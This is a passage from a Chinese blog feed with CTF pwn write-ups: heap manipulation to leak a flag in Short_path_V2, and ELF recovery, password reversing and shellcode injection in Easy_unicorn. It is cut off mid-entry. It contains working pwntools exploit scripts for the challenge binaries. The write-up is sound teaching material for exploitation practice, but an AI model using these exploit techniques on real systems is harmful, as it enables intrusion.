img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 2019 Game </category>
          
      </categories>
      
      
        <tags>
            
            <tag> UAF </tag>
            
            <tag> Double free </tag>
            
            <tag> 沙箱 </tag>
            
            <tag> IO leak </tag>
            
            <tag> 2.23 FSOP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020-高校战疫部分PWN题复盘</title>
      <link href="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/"/>
      <url>/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="Short-path-V2"><a href="#Short-path-V2" class="headerlink" title="Short_path_V2"></a>Short_path_V2</h1><h2 id="IDA分析"><a href="#IDA分析" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>got表可劫持、PIE没开启</p><p>程序一开始就读取flag到bss上了。</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/0.png"></div><p>create功能：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/1.png"></div>我们看到开始就创建了0x10的chunk作为price，但后面有小于0x100的指定size的chunk作为存放name的空间。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/2.png"></div>通过调试我们可以看到flag同时读到了heap中，但是是当前top chunk的下面，那么我们可以控制create中name的size，直到可以刚好控制这个这个flag的位置为我们分配的name chunk的首地址，通过输出将其打印出来。<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/3.png"></div><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># encoding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>debug <span class="token operator">=</span> <span class="token number">1</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./Shortest_path"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span> price<span class="token punctuation">,</span> length<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"---> "</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ID: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Price: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>price<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Length: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Name: \n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"station: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">qurey_station</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"options ---> "</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Station ID: "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token number">0xb0</span><span class="token punctuation">,</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># gdb.attach(p)</span>qurey_station<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Easy-unicorn"><a href="#Easy-unicorn" class="headerlink" title="Easy_unicorn"></a>Easy_unicorn</h1><h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>首先我们看到题目给了三个文件：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/4.png"></div><p>考点：从dump文件恢复elf文件、逆向</p><h2 id="分析及思路"><a href="#分析及思路" class="headerlink" title="分析及思路"></a>分析及思路</h2><p>通过逆向x86_sandbox我们大概知道这么几个点：<br>1.程序通过读取dump文件中的二进制数据后初始化虚拟机sandbox这个对象。<br>2.如果带-info参数的话将会打印读取程序的全部内容</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/5.png"></div>3.带debug则会打印出寄存器等信息4.带tcode会打印出rip的内容，一直执行一直打印同时会完成sandbox的初始化。<p>对于unicorn大概了解下：<br>Unicorn 是一款非常优秀的跨平台模拟执行框架，该框架可以跨平台执行Arm, Arm64 (Armv8), M68K, Mips, Sparc, &amp; X86 (include X86_64)等指令集的原生程序。Unicorn 不仅仅是模拟器，更是一种“硬件级”调试器，使用Unicorn的API可以轻松控制CPU寄存器、内存等资源，调试或调用目标二进制代码，现有的反调试手段对Unicorn 几乎是无效的。</p><p>对于做题帮助不大，目前先定位到-info的参数上，我们看到打印出了dump文件中pwn题的各个段的地址信息，那么我们可以整理一下：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span>data <span class="token operator">=</span> <span class="token triple-quoted-string string">'''| .gcc_except_table            |            401e64  |               f5c  |         24 || debug001                     |      7ffff783b000  |               f88  |       4000 || .data                        |            603090  |              4fb8  |         10 || libc_2.23.so                 |      7ffff7475000  |              5008  |     1c0000 || .fini                        |            4015a4  |            1c5008  |          9 || .plt                         |            4009f0  |            1c5111  |        100 || .jcr                         |            602e00  |            1c5211  |          8 || ld_2.23.so1                  |      7ffff7ffc000  |            1c5219  |       1000 || ld_2.23.so2                  |      7ffff7ffd000  |            1c6219  |       1000 || LOAD                         |            400000  |            1c7239  |        9c8 || .init                        |            4009c8  |            1c7c01  |         1a || [stack]                      |      7ffffffde000  |            1c7c1b  |      21000 || libstdc__.so.6.0.21          |      7ffff7a55000  |            1e8c2b  |     172000 || LOAD2                        |            400af8  |            35ac3b  |          8 || .fini_array                  |            602df8  |            35ac43  |          8 || .prgend                      |            6031d8  |            35ac4b  |          1 || libstdc__.so.6.0.212         |      7ffff7dc7000  |            35ac4c  |       a000 || libstdc__.so.6.0.213         |      7ffff7dd1000  |            364c4c  |       2000 || .plt.got                     |            400af0  |            366c4c  |          8 || libstdc__.so.6.0.211         |      7ffff7bc7000  |            366c54  |       d000 || ld_2.23.so                   |      7ffff7dd7000  |            373c54  |      26000 || libgcc_s.so.1                |      7ffff783f000  |            399c54  |      16000 || libgcc_s.so.11               |      7ffff7a54000  |            3afc54  |       1000 || libm_2.23.so1                |      7ffff7274000  |            3b0c54  |       2000 || libm_2.23.so3                |      7ffff7474000  |            3b2c54  |       1000 || libm_2.23.so2                |      7ffff7473000  |            3b3c54  |       1000 || debug004                     |      7ffff7ffe000  |            3b4c5c  |       1000 || xctf_pwn                     |            401e88  |            3b5c74  |        178 || LOAD1                        |            4009e2  |            3b5dec  |          e || LOAD3                        |            4015a2  |            3b5dfa  |          2 || LOAD5                        |            4019a7  |            3b5e04  |          1 || LOAD4                        |            4015ad  |            3b5e05  |          3 || LOAD7                        |            602e08  |            3b5e08  |        1f0 || LOAD6                        |            401a84  |            3b5ff8  |          4 || [vdso]                       |      7ffff7ffa000  |            3b5ffc  |       2000 || .text                        |            400b00  |            3b7ffc  |        aa2 || libc_2.23.so3                |      7ffff7839000  |            3b8b5e  |       2000 || libc_2.23.so2                |      7ffff7835000  |            3bab5e  |       4000 || libc_2.23.so1                |      7ffff7635000  |            3beb5e  |       9000 || .rodata                      |            4015b0  |            3c7b5e  |        3f7 || .got                         |            602ff8  |            3c7f55  |          8 || .got.plt                     |            603000  |            3c7f5d  |         90 || .eh_frame_hdr                |            4019a8  |            3c7fed  |         dc || .bss                         |            6030a0  |            3c80c9  |        138 || extern                       |            6031e0  |            3c8201  |         98 || libm_2.23.so                 |      7ffff716c000  |            3c8299  |     108000 || [vsyscall]                   |  ffffffffff600000  |            4d0299  |       1000 || [heap]                       |            604000  |            4d1299  |      32000 || .init_array                  |            602df0  |            503299  |          8 || .eh_frame                    |            401a88  |            5032a1  |        3dc || debug003                     |      7ffff7fe7000  |            50367d  |       6000 || xctf_pwn3                    |            603278  |            50967d  |        d88 || xctf_pwn1                    |            602000  |            50a405  |        df0 || xctf_pwn2                    |            6031d9  |            50b1f5  |          7 || debug002                     |      7ffff7dd3000  |            50b1fc  |       4000 |'''</span>data <span class="token operator">=</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    info <span class="token operator">=</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"|"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>            info <span class="token operator">=</span> <span class="token punctuation">[</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> data<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token keyword">in</span> info<span class="token punctuation">]</span>    info <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> info<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> info<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">]</span>    array<span class="token punctuation">.</span>append<span class="token punctuation">(</span>info<span class="token punctuation">)</span>array<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> array<span class="token punctuation">:</span>    <span class="token keyword">print</span> hex<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/6.png"></div><p>那么我们想办法将0x400000到0x604000地址的程序提取出来就行了。</p><pre class="line-numbers language-python"><code class="language-python">f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">"recovery_pwn"</span><span class="token punctuation">,</span><span class="token string">"wb"</span><span class="token punctuation">)</span><span class="token keyword">with</span> open<span class="token punctuation">(</span><span class="token string">"xctf_pwn.dump"</span><span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fd<span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> array<span class="token punctuation">:</span>        <span class="token keyword">if</span> i<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">0x604000</span><span class="token punctuation">:</span>            <span class="token keyword">continue</span>        <span class="token keyword">print</span> <span class="token string">"len of {} is {}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span>i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        fd<span class="token punctuation">.</span>seek<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>fd<span class="token punctuation">.</span>read<span class="token punctuation">(</span>i<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="IDA分析-1"><a href="#IDA分析-1" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>提取了这个二进制文件便开始漫长的分析工作，由于残缺不全导致一些反汇编代码会比较乱，可以从汇编层面进行分析：<br>先看主函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/7.png"></div>首先定位到调用的函数指针，点进去看看：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/8.png"></div>两个函数指针，第一个后门是用于读取flag的，第二个后门是用于执行shellcode的，我们看到后面调用了一次函数指针，那么我们就看看如何满足调用第一个后门函数：查看程序逻辑后发现只要成功通过password检查，就可以调用到这个函数，该password在之前就已经打印出来了：<p>但是注意一点这段最好用汇编查看，比较方便：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/9.png"></div>我们只需要将其换下格式便可以得到password。<pre class="line-numbers language-python"><code class="language-python">data_int_list <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>b<span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_int_list<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>data_bytes <span class="token operator">=</span> b<span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data_int_list<span class="token punctuation">:</span>    data_bytes <span class="token operator">+=</span> p32<span class="token punctuation">(</span>i<span class="token punctuation">)</span>data_bytes_list <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> data_bytes<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes_list<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data_bytes_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>data_bytes_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>data_bytes_list<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>pass_str <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data_bytes_list<span class="token punctuation">:</span>    pass_str <span class="token operator">=</span> pass_str<span class="token operator">+</span><span class="token string">"%02x"</span><span class="token operator">%</span>i<span class="token keyword">print</span><span class="token punctuation">(</span>pass_str<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是我们发现调用第一个后门函数并不能读出flag，分析一下原因：<br>sandbox启动的时候，利用这个函数将this+0x28设为0</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/10.png"></div>我们在看后面<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/11.png"></div>this+0x28=1才会返回文件句柄，由于之前已经设置=0，所以不能正常打开文件。那么就得考虑第二个后门函数，执行shellcode。<p>通过逆向我们发现，输入的password小于4就会令指向vtable指针的值自增一，我们通过0x20次错误输出，再加上一次正确输出，那么我们就可以成功调用第二个后门函数。</p><p>该后门函数会打印输入shellcode的地址，我们输入shellcode，最后输入shellcode地址就可以getshell了。</p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./x86_sandbox"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># data = b"6C141629-681C0134-05159383-00000808"</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"machine-code is"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"password &lt;&lt;"</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span>data_int_list <span class="token operator">=</span> <span class="token punctuation">[</span>int<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span>b<span class="token string">"-"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_int_list<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>data_bytes <span class="token operator">=</span> b<span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data_int_list<span class="token punctuation">:</span>    data_bytes <span class="token operator">+=</span> p32<span class="token punctuation">(</span>i<span class="token punctuation">)</span>data_bytes_list <span class="token operator">=</span> <span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> data_bytes<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes_list<span class="token punctuation">)</span>raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0xe</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data_bytes_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>data_bytes_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>data_bytes_list<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data_bytes_list<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>pass_str <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> data_bytes_list<span class="token punctuation">:</span>    pass_str <span class="token operator">=</span> pass_str<span class="token operator">+</span><span class="token string">"%02x"</span><span class="token operator">%</span>i<span class="token keyword">print</span><span class="token punctuation">(</span>pass_str<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 6C141629-681C0134-05159383-00000808</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"password &lt;&lt;"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>pass_str<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"data ptr:0x"</span><span class="token punctuation">)</span>data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span>shellcode_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>data<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>success<span class="token punctuation">(</span><span class="token string">"shellcode addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>open<span class="token punctuation">(</span><span class="token string">"./flag"</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">0x60f2a8</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x60f2a8</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"data&lt;&lt;"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>payload<span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"ptr&lt;&lt;"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"arg0&lt;&lt;"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"arg1&lt;&lt;"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"arg2&lt;&lt;"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="twochunk"><a href="#twochunk" class="headerlink" title="twochunk"></a>twochunk</h1><h2 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h2><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/12.png"></div>保护全开考点：tcache smashing unlink攻击（victim地址写libc，通过归类smallbin将victim地址归入tcache中从而可控）<h2 id="IDA分析-2"><a href="#IDA分析-2" class="headerlink" title="IDA分析"></a>IDA分析</h2><p>程序一开始mmap一个地址存放name和info并要求输入内容：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/20/2020-gao-xiao-zhan-yi-bu-fen-pwn-ti-fu-pan/13.png"></div><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" 